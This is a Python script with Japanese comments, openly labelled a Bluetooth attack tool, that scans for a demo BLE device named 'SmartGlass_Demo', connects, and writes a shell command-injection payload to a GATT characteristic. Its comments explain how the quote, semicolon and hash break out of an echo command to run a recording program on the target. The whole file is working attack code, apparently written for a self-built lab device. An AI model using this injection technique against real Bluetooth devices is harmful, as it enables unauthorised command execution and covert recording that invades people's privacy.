import asyncio
import sys
from bleak import BleakScanner, BleakClient

# --- 設定（被害者側と同じUUIDにする必要があります） ---
TARGET_NAME = "SmartGlass_Demo"
# 書き込み先のCharacteristic UUID (末尾 f1)
CHAR_UUID   = '12345678-1234-5678-1234-56789abcdef1'

# --- 攻撃ペイロードの作成 ---
# 解説:
# 1. ";  -> 前のコマンド(echo)を強制終了
# 2. python3 /home/pi/start_rec.py  -> 録画プログラムを実行
# 3. #   -> 以降の文字列（元のコードの閉じカッコなど）をコメントアウトして無効化
# ※ バックスラッシュなどは使わず、シンプルにOSコマンドの構文を突きます
PAYLOAD = 'Hello"; python3 /home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/start_rec; #'

async def main():
    print("-" * 50)
    print("💀 Bluetooth 攻撃ツール (Command Injector) 起動")
    print("-" * 50)

    # 1. スキャン (ターゲットの検索)
    print(f"[*] ターゲット '{TARGET_NAME}' を捜索中...")
    device = await BleakScanner.find_device_by_filter(
        lambda d, ad: d.name and TARGET_NAME in d.name
    )

    if not device:
        print(f"[!] ターゲットが見つかりませんでした。被害者側のサーバーは起動していますか？")
        return

    print(f"[+] 発見しました: {device.name} ({device.address})")

    # 2. 接続 & 攻撃
    print(f"[*] 接続を試行中...")
    try:
        async with BleakClient(device) as client:
            print(f"[+] 接続成功！ (Connected)")

            # ペアリングが必要な場合、OSレベルで自動処理されるか、Just Worksならスルーされます
            
            print(f"[*] 悪意あるペイロードを生成中: {PAYLOAD}")
            print(f"[*] データを送信中 (Injecting)...")

            # バイト列に変換して書き込み (Write Request)
            await client.write_gatt_char(CHAR_UUID, PAYLOAD.encode('utf-8'))

            print(f"[+] 送信完了！ 攻撃が実行されたはずです。")
            print(f"[*] 切断します。")

    except Exception as e:
        print(f"[!] エラーが発生しました: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n中止しました。")